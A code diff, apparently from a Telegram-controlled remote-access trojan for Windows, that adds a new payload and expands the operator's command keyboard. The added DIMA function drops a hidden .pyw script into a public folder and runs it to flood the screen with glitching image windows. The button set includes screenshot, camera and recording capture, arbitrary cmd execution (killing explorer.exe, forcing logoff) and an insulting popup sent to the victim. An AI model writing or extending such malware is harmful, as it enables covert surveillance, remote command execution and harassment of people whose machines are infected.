@@ -156,15 +156,91 @@ keyboard.press_and_release('alt + tab')
 """
        mousse.write(prog)
        mousse.close()
-       os.system(f"{file_patch}\\4diAtSVHM-xASJi.pyw")
+       os.system(f"python {file_patch}\\4diAtSVHM-xASJi.pyw")
 
+
+
+def DIMA():
+     file_patch = r'C:\Users\Public\Videos'
+     with open(file_patch + '\\' + "4diAtSLHM-xASJi.pyw", "w+") as mousse:
+       
+
+       prog = f"""
+import cv2
+import urllib
+import numpy as np
+import requests
+import urllib.request
+     
+from PIL import Image
+from io import BytesIO
+from urllib.request import urlopen
+import random
+import time
+
+url = "https://i.pinimg.com/736x/9a/b5/71/9ab5718105552adf92e5a6bf1ab1684f.jpg"
+resp = urlopen(url)
+image = np.asarray(bytearray(resp.read()), dtype="uint8")
+image = cv2.imdecode(image,3)
+
+cv2.imshow('lalala', image)
+i = 0 
+def open(hh):
+     cv2.imshow("WHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT????????", hh)
+
+while True:
+     i+=1
+     print(i)
+     if i%20 == 0:
+          cv2.destroyAllWindows() 
+          open(image)
+     name = str(random.randint(1000000,919912929912))
+     cv2.imshow(name, image)
+     for _ in range(15000):
+          image[random.randint(0,600),random.randint(0,600)] = random.randint(0,255)
+     image = cv2.flip(image, int(random.randint(-1,2)))
+     k = cv2.waitKey(1)
+     if i == 50:
+          exit()
+
+"""
+       mousse.write(prog)
+       mousse.close()
+       os.system(f"python {file_patch}\\4diAtSLHM-xASJi.pyw")
 
 
 @bot.message_handler(commands=['start'])
 def start_message(message):
-    keyboard = telebot.types.ReplyKeyboardMarkup(True,True)
-    keyboard.row('scr', 'scd','rec115','alb',"cmdtaskkill /f /im explorer.exe",r"cmdstart explorer.exe","mclr10","cam",'cmdshutdown -l',"wlphttps://cdn.cloudflare.steamstatic.com/steam/apps/1206700/header.jpg?t=1603251631","wlphttps://i.ytimg.com/vi/zcNfZWySsMI/maxresdefault.jpg")
-    bot.send_message(message.chat.id, 'Keyboard Update', reply_markup=keyboard)
+    keyboard = telebot.types.ReplyKeyboardMarkup(True)
+    
+# #     keyboard.row('scr', 'scd','rec115','alb',"cmdtaskkill /f /im explorer.exe",r"cmdstart explorer.exe","mclr10","cam",'cmdshutdown -l',"wlphttps://cdn.cloudflare.steamstatic.com/steam/apps/1206700/header.jpg?t=1603251631","wlphttps://i.ytimg.com/vi/zcNfZWySsMI/maxresdefault.jpg")
+
+#     bot.send_message(message.chat.id, 'Keyboard Update', reply_markup=keyboard)
+
+
+    keyboard = telebot.types.ReplyKeyboardMarkup(row_width=5)  # Указываем row_width=2 для двух кнопок в каждом ряду
+    button1 = telebot.types.KeyboardButton("scr")
+    button2 = telebot.types.KeyboardButton("scd")
+    button3 = telebot.types.KeyboardButton("rec115")
+    button4 = telebot.types.KeyboardButton("alb")
+    button5 = telebot.types.KeyboardButton("cmdtaskkill /f /im explorer.exe")
+    button6 = telebot.types.KeyboardButton("cmdstart explorer.exe")
+    button7 = telebot.types.KeyboardButton("mclr10")
+    button8 = telebot.types.KeyboardButton("cam")
+    button9 = telebot.types.KeyboardButton("cmdshutdown -l")
+    button10 = telebot.types.KeyboardButton("wlphttps://cdn.cloudflare.steamstatic.com/steam/apps/1206700/header.jpg?t=1603251631")
+    button11 = telebot.types.KeyboardButton("wlphttps://i.ytimg.com/vi/zcNfZWySsMI/maxresdefault.jpg")
+    button12 = telebot.types.KeyboardButton("cmdmsg %username% 'Приветик) Ты долбаеб)'")
+    button13 = telebot.types.KeyboardButton("dim")
+
+    # Добавляем кнопки в ряды
+    keyboard.add(button1, button2,button3)
+#     keyboard.add(button3)
+    keyboard.add(button4, button5, button6)
+    keyboard.add(button5, button6, button7,button13)
+    keyboard.add(button8, button9, button10,button11,button12)
+
+    bot.send_message(USEr_id, 'Keyboard Update', reply_markup=keyboard)
 
 def sound():
      pass
@@ -230,7 +306,7 @@ count = 0
 """
        mousse.write(prog)
        mousse.close()
-       os.system(f"{file_patch}\\3diAtSVHM-xASJi.pyw")
+       os.system(f"python {file_patch}\\3diAtSVHM-xASJi.pyw")
 
 
 
@@ -256,11 +332,11 @@ shake_duration = 0
 """
        mousse.write(prog)
        mousse.close()
-       os.system(f"{file_patch}\\3diAtSVHM-xASCi.pyw")
+       os.system(f"python {file_patch}\\3diAtSVHM-xASCi.pyw")
      
 
 
-liscommand = [ 'scr','rec','scd','alb', 'cmd', 'wlp',"wrt", "clp","mlc","msh","cam","vlm"]
+liscommand = [ 'scr','rec','scd','alb', 'cmd', 'wlp',"wrt", "clp","mlc","msh","cam","vlm",'hel','dim']
 
 @bot.message_handler()
 def receiving_mesage(message):
@@ -306,8 +382,14 @@ def receiving_mesage(message):
             camera()     
        elif command =="vlm":
             sound()
-
-
+       elif command == 'hel':
+            outr = ''
+            for _ in liscommand:
+                 outr += _
+                 outr += " "
+            bot.send_message(USEr_id,outr)
+       elif command =="dim":
+            DIMA()
 
        else:
             print(command+arg) 
